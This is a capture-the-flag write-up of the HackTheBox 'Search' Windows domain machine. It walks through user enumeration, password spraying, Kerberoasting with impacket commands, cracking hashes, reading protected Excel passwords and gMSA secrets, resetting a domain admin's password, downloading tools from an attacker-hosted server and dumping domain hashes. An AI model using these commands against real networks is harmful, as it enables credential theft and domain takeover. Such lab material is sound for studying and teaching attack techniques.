# HackTheBox-Search

## NMAP

```bash

PORT      STATE SERVICE       VERSION            
53/tcp    open  domain?                                                
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-19 09:28:07Z)                                                  
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
445/tcp   open  microsoft-ds?                                          
464/tcp   open  kpasswd5?                                              
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)                   
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC                   
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0            
49670/tcp open  msrpc         Microsoft Windows RPC                   
49677/tcp open  msrpc         Microsoft Windows RPC                       
49699/tcp open  unknown                                                
49725/tcp open  msrpc         Microsoft Windows RPC                   
```

## PORT 139/445 (SMB)

We can check for null authentication on SMB to see if we can we access any shares

<img src="https://i.imgur.com/5ssMRXw.png"/>

And we are not allowed to list shares , let's run `enum4linux-ng` which will enumerate both smb and ldap

<img src="https://i.imgur.com/kcLaeqG.png"/>

<img src="https://i.imgur.com/5jzJW49.png"/>

We only get information of the domain and the operating system that the machine is using


## PORT 80 (HTTP)

On IIS server we can see a template being used

<img src="https://i.imgur.com/iLGbIqV.png"/>

We also see some usernames , so we can try to create a list of usernames using their intials and lastname 

<img src="https://i.imgur.com/RkYIGkY.png"/>

<img src="https://i.imgur.com/6smKJIF.png"/>

Running `gobuster` didn't really found anything expect for `/Staff` which was forbidden

<img src="https://i.imgur.com/bj0N82E.png"/>

I saw an image in the slider

<img src="https://i.imgur.com/e1aIJ5V.png"/>

<img src="https://i.imgur.com/BGOj63R.png"/>

Let's add usernames from this image to our list , also there's a password `IsolationIsKey?` and using `kerbrute` we can brute force to see which usernames are valid on the domain

<img src="https://i.imgur.com/0czdz26.png"/>

Here out of some usernames we have only 4 valid domain names ,so the format is `firstname.lastname` , so using `crackmapexec` we can brute force the password that we found

<img src="https://i.imgur.com/TsmVB1R.png"/>
So `hope.sharp` can login through smb , using `smbclient` we can list the shares now

<img src="https://i.imgur.com/OAGQJra.png"/>

Using `smbmap` we can on which shares we have rights 

<img src="https://i.imgur.com/ymzFWZ2.png"/>

<img src="https://i.imgur.com/JmMSZGg.png"/>

Let's first try to get a list of usernames now since we are authenticated , so using `windapsearch` which works with LDAP to enumreate users

<img src="https://i.imgur.com/YZ3slPx.png"/>

We got more users , now let's create a list of them using `grep` and `awk` to filter only usernames 

<img src="https://i.imgur.com/5zJOsHZ.png"/>

We have a service account `web_svc` , let's try to do `kerberoasting` as we have a valid set of credentials so we can request for a TGS for  this account or just a provide the username list maybe we can get other account hashses too , so using impacket's `GetUserSPNS`

```bash
python3 /opt/impacket/examples/GetUserSPNs.py  -target-domain search.htb -request -dc-ip 10.129.247.201 -usersfile new_users.txt search.htb/hope.sharp
```

<img src="https://i.imgur.com/Q7Wo1NQ.png"/>

We get `krbtgt` account's hash which is an account responsible for signing tickets / creating tickets (TGT ,TGS) 

<img src="https://i.imgur.com/U7ue03f.png"/>

Next we get a hash for `web_svc` account , I tried to check if there was AS-REP roasting using `kerbrute` but didn't find any account with pre-auth disabled

<img src="https://i.imgur.com/Ae9TB63.png"/>

But didn't found any accounts like that so let's just crack the hashes that we have found, we can find the mode of this hash type from hashcat examples

<img src="https://i.imgur.com/UGihv8c.png"/>

When I tried to crack this , hashcat was giving a message about "exahust" and it was weird , turns out that we don't need to specfiy a userlist when we check for accounts assoicated with SPNs 

```bash
python3 /opt/impacket/examples/GetUserSPNs.py -request -dc-ip 10.129.247.201 search.htb/hope.sharp
:"IsolationIsKey?" -outputfile hashes.kerberoast

```

<img src="https://i.imgur.com/snUEiXR.png"/>

Now running hashcat

<img src="https://i.imgur.com/xGzNO9F.png"/>

<img src="https://i.imgur.com/03brMl8.png"/>

We can try to see if we can get a shell with this service account

<img src="https://i.imgur.com/dx8fQC4.png"/>

Still we have access to smb , we still have a lot usernames so we can try to perform a password spray through `kerbrute`

<img src="https://i.imgur.com/mBvrhEP.png"/>

Now let's see if we can get a winrm session with this user

<img src="https://i.imgur.com/x8qLJdw.png"/>

And still no , so let's just see what's in this user's directory

<img src="https://i.imgur.com/cVArJHo.png"/>

We can go into `RedirectedFolders$` and then into `edgar.jacobs/Desktop` , we see a excel document

<img src="https://i.imgur.com/A8V9fPg.png"/>

<img src="https://i.imgur.com/QguE9TO.png"/>

We can download it using `get`

<img src="https://i.imgur.com/Bti7chk.png"/>

Opening the xlsx document ,we can see two worksheets, the first one just shows the statstics of how many passwords were captured and the other sheet shows the usernames with passwords but that worksheet is password protected and have the rows or columns hidden , so they are two ways to read the passwords in this scenario.

First being that we can actually unzip the document and can read files so let's try that

<img src="https://i.imgur.com/qZTyV5p.png"/>

<img src="https://i.imgur.com/xbeio6c.png"/>

From here we can read the passwords but this isn't the best and most efficient way of reading passwords.

The second way is that we do unzip the document and then go to xml file of the sheet which is protected by password , remove the `<sheetProtection/>` tag from the xml , create the archive again and rename it to xlsx and then open the document and un hide the rows or columns or it's going to unhide it automatically

```xml
</sheetData><sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
```

This is the tag that we want to remove and nothing else

<img src="https://i.imgur.com/83hPFEr.png"/>

<img src="https://i.imgur.com/3MjfM9D.png"/>

Save them for a brute force attack through crackmapexec

<img src="https://i.imgur.com/sGqL1aG.png"/>

<img src="https://i.imgur.com/ZqlPgRV.png"/>

After sometime we'll get correct set of credential

<img src="https://i.imgur.com/fouCYFm.png"/>

We can then just grab the user flag from , but still there's more enumeration that we need to do now , we can either run sharphound to enumerate AD which fill save results in an archive or we can use python bloodhound which will give us the output in json , both of them do the same job but I'll just go with python

<img src="https://i.imgur.com/tDPwdsB.png"/>

<img src="https://i.imgur.com/lMFkwax.png"/>

Launch `neo4j` with neo4j console and run `bloodhound`, after importing the json files and makring the user as `pwned` we can run a pre-built query for path to higher targets which will shows a graph for what we can do with this user

<img src="https://i.imgur.com/X7h0AK4.png"/>

## Privilege Escalation (Tristan.Davies -> Administrator)

This user is a member of `ITSEC` group which has `ReadGMSAPassword` rights to an account `BIR-ADFS-GMSA` , GMSA means Group Managed Service Accounts , in active directory it's a hassle to change change service accounts passwords so this gmsa account is responsible for service accounts passwords and it's hash isn't easy to crack as it's randomly generated

So we can read this account's hash and later use that to login  , in order to read that I used `gMSADumper.py` from github

<img src="https://i.imgur.com/sYRaIqD.png"/>

<img src="https://i.imgur.com/ITVDB2W.png"/>

If we look furhter from what we can do from this computer account since it has `$` at the end of the name

<img src="https://i.imgur.com/AIGuz1A.png"/>

This has `genericall` on the account `Tristan.Davies` and that account is a member of `Enterprise Admin` , `Administrator`  and `Domain Admin` so we pretty much can comprompise the domain controller after getting this user , so this is really simple to abuse , since everything in AD is object and this user is considerd as a object we can set permissions on this object , can even change his password without knowing it 

## Method 1 (un-intended)

Winrrm was completely disabled on this machine , and it was disabled after almost 50 users rooted this machine , winrm wasn't supposed to be running on the machine (at least what they told in the discord ) , so having functionality of getting a remote session we can just somply login as the account who has  `genericall` , meaning tha twe can do anything with that user account , so simply changing the password was possible `net user username password`

<img src="https://i.imgur.com/Qwfr8ae.png"/>

Now we can use impacket's `secretsdump.py` to dump all password hashes

<img src="https://i.imgur.com/nQNyEet.png"/>

<img src="https://i.imgur.com/C7uJGcc.png"/>

## Method 2 (intended)

Since winrm was disabled , and there wasn't any way to get a shell and change the password through `net user` another way was that since `rpcclient` allows pass the hash , we can login with the `BIR-ADFS-GMSA` with his password hash and change the password with this command

```bash
setuserinfo2 Tristan.Davies 23 'arzismol'
```

<img src="https://i.imgur.com/eABijM4.png"/>

Now simply just dump the hashes using impacket's secretsdump.py

<img src="https://i.imgur.com/v1g7LTH.png"/>

But winrm is disabled so the question is how will we get a shell ? We can check with crackmapexec to see if we get the status "pwned"

<img src="https://i.imgur.com/Qz0sJui.png"/>

I tried `smbexec` and `psexec` both failed but `wmiexec` worked

<img src="https://i.imgur.com/jArufNu.png"/>

## Method 3

Going into `Sierra.Frye`'s directory through smb share `RedirectedFolders$` we can see a file in `Downloads\Backups\staff.pfx`

<img src="https://i.imgur.com/bpZsl6x.png"/>

Download it through `get <filename>`

<img src="https://i.imgur.com/XioSDYT.png"/>

To read the certificate we need the password 

<img src="https://i.imgur.com/jIEK7Ie.png"/>

Since I was using ubuntu and didn't had the john jumbo I had to install it from this , then use `pfx2john.py` to get hash of pfx file

https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-UBUNTU

<img src="https://i.imgur.com/JIPN0gX.png"/>

<img src="https://i.imgur.com/jaXkdOW.png"/>

Import the pfx file through browser by going into `Settins -> Security & Privacy -> View Certificates` then import the pfx file in `Your Certificates` tab

<img src="https://i.imgur.com/YdKZ8gq.png"/>

Make sure that domain name `search.htb` is in `/etc/hosts` file

<img src="https://i.imgur.com/d8j7vs2.png"/>

Make a https request to `/staff ` as we that endpoint at the start

<img src="https://i.imgur.com/IYjnJOz.png"/>

We can login with `Sierra.Frye` 's credentials

<img src="https://i.imgur.com/L3w52pv.png"/>

<img src="https://i.imgur.com/8B1aKAj.png"/>

now inorder to run commands as `BIR-ADFS-GMSA$` we need to import `DSInternals` module which can be downloaded from github

https://github.com/MichaelGrafnetter/DSInternals/releases/tag/v4.7

Then host this using python3 , an issue can occur when we will be downloading it through web based powershell so the proper command to download it will be

```powershell
Invoke-WebRequest -Uri http://ip/dsinterals.zip -UseBasicParsing -OutFile
```

After having that on the system you can unzip it using  the command

```powershell
Expand-Archive -Path dsinternals.zip -DestinationPath dsinternals
````

Then go to dsinternals and run command `Import-Module .\DsInternals`, now the module has been loaded and you can see it's functions

```powershell
Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA$' -Properties PrincipalsAllowedToRetrieveManagedPassword
```

<img src="https://i.imgur.com/4pfP72M.png"/>

<img src="https://i.imgur.com/hAqxUEN.png"/>

We have saved the blob password for `BIR-ADFS-GMSA$` account , now we need to use the `SecureCurrentPassword` property to run commands as this account, so we are going to create a variable which will have this account's secure string and the account name

```powershell
$Credential = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA$,$pt.SecureCurrentPassword
```

<img src="https://i.imgur.com/Y3mjEYd.png"/>

Now we just need to invoke command in a script block using this variable

```powershell
Invoke-Command -Computer Research -Credential $Credential -ScriptBlock { whoami}
```

<img src="https://i.imgur.com/swR9vxB.png"/>

Perfect , we can run commands as this account which means we can now change `Tristan.Davies` account password

```powershell
Invoke-Command -Computer Research -Credential $Credential -ScriptBlock { net user Tristan.Davies arzissmol }
```

Now follow the same steps to invoke commands as `Tristan`

<img src="https://i.imgur.com/F7HGNnI.png"/>

<img src="https://i.imgur.com/Wsdnq5z.png"/>

<img src="https://i.imgur.com/pW9Rdbu.png"/>

<img src="https://i.imgur.com/tym0N9X.png"/>

Being a domain admin we can dump all hashes

## References
- https://github.com/ropnop/kerbrute
- https://hashcat.net/wiki/doku.php?id=example_hashes
- https://github.com/micahvandeusen/gMSADumper
- http://www.excelsupersite.com/how-to-remove-an-excel-spreadsheet-password-in-6-easy-steps/
- https://malicious.link/post/2017/reset-ad-user-password-with-linux/
- https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/
- https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-UBUNTU
- https://gist.github.com/NotMedic/e098ddef056fcea4288051e7d78a4618
- https://www.youtube.com/watch?v=kFfYHmLmwVc&t=3842s&ab_channel=IppSec
- https://stackoverflow.com/questions/51536342/uri-usebasicparsing-powershell
- https://www.nsoftware.com/kb/articles/psasp-invoke-command-with-new-pssession.rst

